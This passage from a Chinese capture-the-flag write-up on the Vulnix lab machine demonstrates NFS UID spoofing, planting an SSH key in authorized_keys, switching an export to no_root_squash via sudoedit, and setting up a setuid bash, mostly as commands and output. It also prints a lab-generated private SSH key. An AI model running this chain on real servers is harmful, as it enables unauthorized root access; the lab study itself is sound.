class="string">&#x27;192.168.66.18 (192.168.66.18)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.66.18<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">user@192.168.66.18&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Thu Apr 16 03:53:37 BST 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0              Processes:           89</span><br><span class="line">  Usage of /:   90.2% of 773MB   Users logged <span class="keyword">in</span>:     0</span><br><span class="line">  Memory usage: 7%               IP address <span class="keyword">for</span> eth0: 192.168.66.18</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  =&gt; / is using 90.2% of 773MB                                                                                                        </span><br><span class="line">                                                                                                                                      </span><br><span class="line">  Graph this data and manage this system at https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line">user@vulnix:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(user) gid=1000(user) <span class="built_in">groups</span>=1000(user),100(<span class="built_in">users</span>)</span><br><span class="line">user@vulnix:~$ <span class="built_in">whoami</span></span><br><span class="line">user</span><br><span class="line">user@vulnix:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/user</span><br><span class="line">user@vulnix:~$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux vulnix 3.2.0-29-generic-pae <span class="comment">#46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux</span></span><br></pre></td></tr></table></figure>
+
+<p>当然，该用户不是sudoer。</p>
+<h3 id="ssh-key毒化以getshell"><a href="#ssh-key毒化以getshell" class="headerlink" title="ssh key毒化以getshell"></a>ssh key毒化以getshell</h3><p>不得已时尝试以vulnix用户身份登录。</p>
+<p>检查受害服务器上的&#x2F;etc&#x2F;passwd文件，发现用户vulnix具有UID 2008，因此在本地计算机上创建了一个名为vulnix的用户，UID为2008，然后尝试再次访问该分区：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">user@vulnix:~$ <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">syslog:x:101:103::/home/syslog:/bin/false</span><br><span class="line">messagebus:x:102:105::/var/run/dbus:/bin/false</span><br><span class="line">whoopsie:x:103:106::/nonexistent:/bin/false</span><br><span class="line">postfix:x:104:110::/var/spool/postfix:/bin/false</span><br><span class="line">dovecot:x:105:112:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false</span><br><span class="line">dovenull:x:106:65534:Dovecot login user,,,:/nonexistent:/bin/false</span><br><span class="line">landscape:x:107:113::/var/lib/landscape:/bin/false</span><br><span class="line">sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">user:x:1000:1000:user,,,:/home/user:/bin/bash</span><br><span class="line">vulnix:x:2008:2008::/home/vulnix:/bin/bash</span><br><span class="line">statd:x:109:65534::/var/lib/nfs:/bin/false</span><br></pre></td></tr></table></figure>
+
+<p>使用新创建的vulnix用户（具有UID 2008权限）成功进入已经挂载的&#x2F;mnt&#x2F;vulnix文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># useradd vulnix</span></span><br><span class="line">root@kali:~<span class="comment"># passwd vulnix</span></span><br><span class="line">新的 密码：</span><br><span class="line">重新输入新的 密码：</span><br><span class="line">passwd：已成功更新密码</span><br><span class="line">root@kali:~<span class="comment"># leafpad /etc/passwd</span></span><br><span class="line">root@kali:~<span class="comment"># su vulnix</span></span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">android-backup-recover.jar  ctf               go                  Linux_Exploit_Suggester.pl  proxychains-ng  TheFatRat</span><br><span class="line">ant                         Desktop           gobackdoor          linuxprivchecker.py         pwndbg          translatefiles</span><br><span class="line">antshells                   dirmap            gobackdoor.go       linux-sendpage3             pycdc           trojan</span><br><span class="line">antsword                    dirsearch         HiddenEye           location                    safedog2.py     uncompyle2</span><br><span class="line">BlindWaterMark              Downloads         historyvulnhub      Lucifer113.ovpn             safedog.py      vulnhub</span><br><span class="line">burpextend                  dvcs-ripper       hsdecomp            lxd-alpine-builder          shells          WAFNinja</span><br><span class="line">cansina                     Fatrat_Generated  knock-knock-master  picture                     SocialFish</span><br><span class="line">checkifbase64.py            GitHack           LinEnum.sh          pkcrack                     struts-pwn</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=2008(vulnix) gid=2008 组=2008</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/root</span><br><span class="line">$ <span class="built_in">cd</span> /mnt/vulnix</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/mnt/vulnix</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">vulnix</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=2008(vulnix) gid=2008 组=2008</span><br><span class="line">$ <span class="built_in">ls</span> -la</span><br><span class="line">总用量 20</span><br><span class="line">drwxr-x--- 2 nobody 4294967294 4096 9月   2  2012 .</span><br><span class="line">drwxr-xr-x 3 root   root       4096 4月  15 23:00 ..</span><br><span class="line">-rw-r--r-- 1 nobody 4294967294  220 4月   3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 nobody 4294967294 3486 4月   3  2012 .bashrc</span><br><span class="line">-rw-r--r-- 1 nobody 4294967294  675 4月   3  2012 .profile</span><br></pre></td></tr></table></figure>
+
+<p>已经进入，生成一个SSH密钥，以vulnix用户身份登录而不需要密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># ssh-keygen -t rsa</span></span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/root/.ssh/id_rsa): /root/vulnhub/vulnix/id_rsa</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /root/vulnhub/vulnix/id_rsa</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /root/vulnhub/vulnix/id_rsa.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:spDzqP71ppmCK9Ls2eSA+m1TFlI8Rs5xptB4isWBn7M root@kali</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 3072]----+</span></span><br><span class="line"><span class="string">|   oo*o o        |</span></span><br><span class="line"><span class="string">|  . ++B=         |</span></span><br><span class="line"><span class="string">|   + *+.         |</span></span><br><span class="line"><span class="string">|  . *..          |</span></span><br><span class="line"><span class="string">|    ++..S        |</span></span><br><span class="line"><span class="string">| .  E=oo         |</span></span><br><span class="line"><span class="string">|.o..oo+          |</span></span><br><span class="line"><span class="string">|+ +O+. +.        |</span></span><br><span class="line"><span class="string">|o=B+=o+o.        |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">root@kali:~/vulnhub/vulnix# ls</span></span><br><span class="line"><span class="string">id_rsa  id_rsa.pub  user.txt</span></span><br><span class="line"><span class="string">root@kali:~/vulnhub/vulnix# cat id_rsa</span></span><br><span class="line"><span class="string">-----BEGIN OPENSSH PRIVATE KEY-----</span></span><br><span class="line"><span class="string">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span></span><br><span class="line"><span class="string">NhAAAAAwEAAQAAAYEA3rZnUKi375a1jnBNaY1apRRslsyf+YG8mMrGKcnEwDGEXcKaeyna</span></span><br><span class="line"><span class="string">zdXsBDPf/0V2kQA9XYPBG+Q/ppc6hl4BpmDi+SbEDH5KSX2SPyON1qeYAAu9kfwSx8HOxW</span></span><br><span class="line"><span class="string">SPUYePPCOnuqxcBA2iIISsmSq10QR7mMSiADqpGFjM0C/22NhLbdEX4WSsJPbOJVhJFLn9</span></span><br><span class="line"><span class="string">VCtVGpLC/g3Cu3CYJ5EtuAfvAYcwvgjJjW0Rb7Euv7nsBaTVfcFWkCfPzFgXGzdhnLORLP</span></span><br><span class="line"><span class="string">Ig29l0NrHkxTbh0cfNpcUrSRO8xSUUF8ACMxObbuVcjzbpXX8rrTaxemE89vFVG6zLRxEX</span></span><br><span class="line"><span class="string">0Fk21EHc/CMfYj7RrHYUek689KaKKGfS/X5dNQIwJ0kfR/zkz5L1WrkemrM+wJPamxeckL</span></span><br><span class="line"><span class="string">DEGVTdg1HmIOwVsFpKV/QiAQijPnCQfa1f2buQxOOSla2rD80bGYIPlJ2/ZdYR/GizM+6Q</span></span><br><span class="line"><span class="string">Er+XcCTzWYDsKT2NYO+ZVCROgxTR2CyLuY4Hb+M7AAAFgHbM1252zNduAAAAB3NzaC1yc2</span></span><br><span class="line"><span class="string">EAAAGBAN62Z1Cot++WtY5wTWmNWqUUbJbMn/mBvJjKxinJxMAxhF3Cmnsp2s3V7AQz3/9F</span></span><br><span class="line"><span class="string">dpEAPV2DwRvkP6aXOoZeAaZg4vkmxAx+Skl9kj8jjdanmAALvZH8EsfBzsVkj1GHjzwjp7</span></span><br><span class="line"><span class="string">qsXAQNoiCErJkqtdEEe5jEogA6qRhYzNAv9tjYS23RF+FkrCT2ziVYSRS5/VQrVRqSwv4N</span></span><br><span class="line"><span class="string">wrtwmCeRLbgH7wGHML4IyY1tEW+xLr+57AWk1X3BVpAnz8xYFxs3YZyzkSzyINvZdDax5M</span></span><br><span class="line"><span class="string">U24dHHzaXFK0kTvMUlFBfAAjMTm27lXI826V1/K602sXphPPbxVRusy0cRF9BZNtRB3Pwj</span></span><br><span class="line"><span class="string">H2I+0ax2FHpOvPSmiihn0v1+XTUCMCdJH0f85M+S9Vq5HpqzPsCT2psXnJCwxBlU3YNR5i</span></span><br><span class="line"><span class="string">DsFbBaSlf0IgEIoz5wkH2tX9m7kMTjkpWtqw/NGxmCD5Sdv2XWEfxoszPukBK/l3Ak81mA</span></span><br><span class="line"><span class="string">7Ck9jWDvmVQkToMU0dgsi7mOB2/jOwAAAAMBAAEAAAGAQTkYDrYqj/8KErnu4d+k0T2nA4</span></span><br><span class="line"><span class="string">7Ptul4yyJvYGOXvFWEF1VbmoBKdQeWRDDRA9ha/eIdFpr0Xe+9eFNHr3wubYRoVGE2/xWp</span></span><br><span class="line"><span class="string">OdaNkvIdouSYDkNh9DPnaBrpLEPj+RODLjCe+Xtqw0Ee3vkb9wtcDeeLLtU/QGPti5TN/p</span></span><br><span class="line"><span class="string">Zda2oExRd8L+UkyPqCqsstM+W4PAMovEyI0JBFHFHALa5FvmSMaV0nODAonsN3XMd+EmYn</span></span><br><span class="line"><span class="string">qgt4/og1iqguIgEWW0EfSDbAFeDKWdFWPYuGcW+JAS7rwOMycJtofY0y6zb459HA/j6x2Z</span></span><br><span class="line"><span class="string">Gk/vWfi7NPjJTncm5EkN7PIUWljhjwuOGSwnr5QRXomU61Us3L+nljFybF3hsLSKXK/9tV</span></span><br><span class="line"><span class="string">q2VuoAPbHInVOsGAwiFMdKQAlizCNw9RkPAASSopE9LZDxZXaSz2knPX43n/yH0fTs2jMG</span></span><br><span class="line"><span class="string">VUunGXRbzbP1sNGWlrq53F1zdDFhKw2RsnwnEJqTxey1RHgNxfQ9Idkr7seqSEHpGpAAAA</span></span><br><span class="line"><span class="string">wQDzzeeHsiAXeYWVjkI8dM6Vvm7dNOvvpwm+lYkRNh8tNfBw2tGzSC5Djx0ADLZxDryhoL</span></span><br><span class="line"><span class="string">osnG4dQeSeASV3gK0qRDHJgIxJyoaLNc3udOjZ+PQuTtSHWb5Ng6NxvqghTrQepab5IgtE</span></span><br><span class="line"><span class="string">qaOkquhIr4sq0FwuHfJmbDqcIqcEc7qsfdxdKnf7+E1ii1APVl9BUNODzaJmI1kUnv12YR</span></span><br><span class="line"><span class="string">cx+OYi5qbih4O6BCVkUMqYn9nIVOfwwY+ndonxV+OyOxj5tDIAAADBAPT9intj92Pnrm0c</span></span><br><span class="line"><span class="string">ZIPUdAD68FGp9jL+ca6CTnjp/7cRrlBBCd2SUoS34Demerk2q3g0xFBlfcheUpzdPr7Wh0</span></span><br><span class="line"><span class="string">bANVoeKOztj1Z5bVrICJB3kNvhpHZQ6BdscTgiWeFHBQ8OW1z4q1umPOVnX0/PH2eEHS7s</span></span><br><span class="line"><span class="string">lDkoBPU9fuj01ZQg8hHO1xb54a7Gg9paqVvfHQnvZz9Jw3z/+B9GQK8uL2UfwrTuErarGz</span></span><br><span class="line"><span class="string">kEjeOeX/Q6OC+y+2YyBsGxmdKeeByKtwAAAMEA6LiR2x5pWbKTUTklwZrX+mPGFSaRMGow</span></span><br><span class="line"><span class="string">i8M+gykhualFDvXYRb5gtluRmbmgKvIKaijYWgTWpod2p+ghg7V5KSby/oWbWo8dM7DVeR</span></span><br><span class="line"><span class="string">DPdGhJ2xFRqHhVBJ0MugjMnZFE11UAS6hPFLYl5L1Ow54pAw0f/OBVzEGuZuVnF1i84tzx</span></span><br><span class="line"><span class="string">4r70/fHHXH8d6PYtehcL1O/wjNfjkkHONI/GxwAZzzF5Yn1h1aIB4X4B6iXkj+TJIAQcHe</span></span><br><span class="line"><span class="string">vU05iNf3ixaredAAAACXJvb3RAa2FsaQE=</span></span><br><span class="line"><span class="string">-----END OPENSSH PRIVATE KEY-----</span></span><br><span class="line"><span class="string">root@kali:~/vulnhub/vulnix# cat id_rsa.pub </span></span><br><span class="line"><span class="string">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDetmdQqLfvlrWOcE1pjVqlFGyWzJ/5gbyYysYpycTAMYRdwpp7KdrN1ewEM9//RXaRAD1dg8Eb5D+mlzqGXgGmYOL5JsQMfkpJfZI/I43Wp5gAC72R/BLHwc7FZI9Rh488I6e6rFwEDaIghKyZKrXRBHuYxKIAOqkYWMzQL/bY2Ett0RfhZKwk9s4lWEkUuf1UK1UaksL+DcK7cJgnkS24B+8BhzC+CMmNbRFvsS6/uewFpNV9wVaQJ8/MWBcbN2Gcs5Es8iDb2XQ2seTFNuHRx82lxStJE7zFJRQXwAIzE5tu5VyPNuldfyutNrF6YTz28VUbrMtHERfQWTbUQdz8Ix9iPtGsdhR6Trz0poooZ9L9fl01AjAnSR9H/OTPkvVauR6asz7Ak9qbF5yQsMQZVN2DUeYg7BWwWkpX9CIBCKM+cJB9rV/Zu5DE45KVrasPzRsZgg+Unb9l1hH8aLMz7pASv5dwJPNZgOwpPY1g75lUJE6DFNHYLIu5jgdv4zs= root@kali</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在终端上以’vulnix’用户身份将生成的ssh-key复制到’&#x2F;home&#x2F;vulnix&#x2F;.ssh&#x2F;authorized_keys’文件中：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> .ssh</span><br><span class="line">$ <span class="built_in">cd</span> .ssh</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/mnt/vulnix/.ssh</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDetmdQqLfvlrWOcE1pjVqlFGyWzJ/5gbyYysYpycTAMYRdwpp7KdrN1ewEM9//RXaRAD1dg8Eb5D+mlzqGXgGmYOL5JsQMfkpJfZI/I43Wp5gAC72R/BLHwc7FZI9Rh488I6e6rFwEDaIghKyZKrXRBHuYxKIAOqkYWMzQL/bY2Ett0RfhZKwk9s4lWEkUuf1UK1UaksL+DcK7cJgnkS24B+8BhzC+CMmNbRFvsS6/uewFpNV9wVaQJ8/MWBcbN2Gcs5Es8iDb2XQ2seTFNuHRx82lxStJE7zFJRQXwAIzE5tu5VyPNuldfyutNrF6YTz28VUbrMtHERfQWTbUQdz8Ix9iPtGsdhR6Trz0poooZ9L9fl01AjAnSR9H/OTPkvVauR6asz7Ak9qbF5yQsMQZVN2DUeYg7BWwWkpX9CIBCKM+cJB9rV/Zu5DE45KVrasPzRsZgg+Unb9l1hH8aLMz7pASv5dwJPNZgOwpPY1g75lUJE6DFNHYLIu5jgdv4zs= root@kali&quot;</span> &gt; authorized_keys</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>然后使用ssh私匙登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># ssh vulnix@192.168.66.18 -i id_rsa</span></span><br><span class="line">Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Thu Apr 16 04:23:19 BST 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0              Processes:           92</span><br><span class="line">  Usage of /:   90.2% of 773MB   Users logged <span class="keyword">in</span>:     1</span><br><span class="line">  Memory usage: 9%               IP address <span class="keyword">for</span> eth0: 192.168.66.18</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  =&gt; / is using 90.2% of 773MB</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line">New release <span class="string">&#x27;14.04.6 LTS&#x27;</span> available.</span><br><span class="line">Run <span class="string">&#x27;do-release-upgrade&#x27;</span> to upgrade to it.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">vulnix@vulnix:~$ <span class="built_in">id</span></span><br><span class="line">uid=2008(vulnix) gid=2008(vulnix) <span class="built_in">groups</span>=2008(vulnix)</span><br><span class="line">vulnix@vulnix:~$ <span class="built_in">whoami</span></span><br><span class="line">vulnix</span><br><span class="line">vulnix@vulnix:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/vulnix</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vulnix@vulnix:~$ sudo -l</span><br><span class="line">Matching <span class="string">&#x27;Defaults&#x27;</span> entries <span class="keyword">for</span> vulnix on this host:</span><br><span class="line">    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User vulnix may run the following commands on this host:</span><br><span class="line">    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports</span><br></pre></td></tr></table></figure>
+
+<p>很好,vulnix可以运行命令来打开&#x2F;etc&#x2F;exports，不用输入密码。这是发现的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vulnix@vulnix:~$ sudoedit /etc/exports</span><br><span class="line"><span class="comment"># /etc/exports: the access control list for filesystems which may be exported</span></span><br><span class="line"><span class="comment">#               to NFS clients.  See exports(5).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example for NFSv2 and NFSv3:</span></span><br><span class="line"><span class="comment"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example for NFSv4:</span></span><br><span class="line"><span class="comment"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span></span><br><span class="line"><span class="comment"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">/home/vulnix    *(rw,root_squash)</span><br></pre></td></tr></table></figure>
+
+<p>还记得之前说过的有关Root squashing的内容吗？（感谢课程，Owen xD）</p>
+<p>用no_root_squash替换了root_squash flag。需要作弊，因为没有vulnix的密码，而且没有sudo用户执行命令&#x2F;usr&#x2F;sbin&#x2F;exportfs -a或计算机重新引导，就无法再次导出NFS分区，所以手动重新引导（Boooooo，真是个n0o0o0o0ob !!）</p>
+<ul>
+<li>root_squash： 客户端的root用户映射到任何人：客户端无法使用setuid位将恶意软件留给他人执行。</li>
+<li>no_root_squash：通过此选项，停用了此安全功能，从而允许客户端的root权限操作最终以root身份出现在导出的文件系统中（因此，在其余客户端中）。</li>
+</ul>
+<p>机器重新启动后，再次安装该分区并以本地root用户身份访问。</p>
+<p>检查机器是否再次启动（再次抱歉！）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ping -c 4 192.168.66.18</span></span><br><span class="line">PING 192.168.66.18 (192.168.66.18) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.66.18: icmp_seq=1 ttl=64 time=1.04 ms</span><br><span class="line">64 bytes from 192.168.66.18: icmp_seq=2 ttl=64 time=0.279 ms</span><br><span class="line">64 bytes from 192.168.66.18: icmp_seq=3 ttl=64 time=0.482 ms</span><br><span class="line">64 bytes from 192.168.66.18: icmp_seq=4 ttl=64 time=0.492 ms</span><br><span class="line"></span><br><span class="line">--- 192.168.66.18 ping statistics ---</span><br><span class="line">4 packets transmitted, 4 received, 0% packet loss, time 3033ms</span><br><span class="line">rtt min/avg/max/mdev = 0.279/0.572/1.037/0.281 ms</span><br></pre></td></tr></table></figure>
+
+<p>然后再次挂载分区：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># mount 192.168.66.18:/home/vulnix /mnt/vulnix</span></span><br><span class="line">root@kali:~<span class="comment"># cd /mnt/vulnix</span></span><br><span class="line">root@kali:/mnt/vulnix<span class="comment"># ls</span></span><br><span class="line">local_shell</span><br></pre></td></tr></table></figure>
+
+<p>挂载后，获得了受害者计算机本地shell的副本，并将所有权和SID更改为root：</p>
+<p>在受害者的机器上，如“vulnix”：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vulnix@vulnix:~$ <span class="built_in">cp</span> /bin/bash local_shell</span><br><span class="line">vulnix@vulnix:~$ <span class="built_in">ls</span></span><br><span class="line">local_shell</span><br></pre></td></tr></table></figure>
+
+<p>在本地计算机上，以<code>root</code>身份：</p>
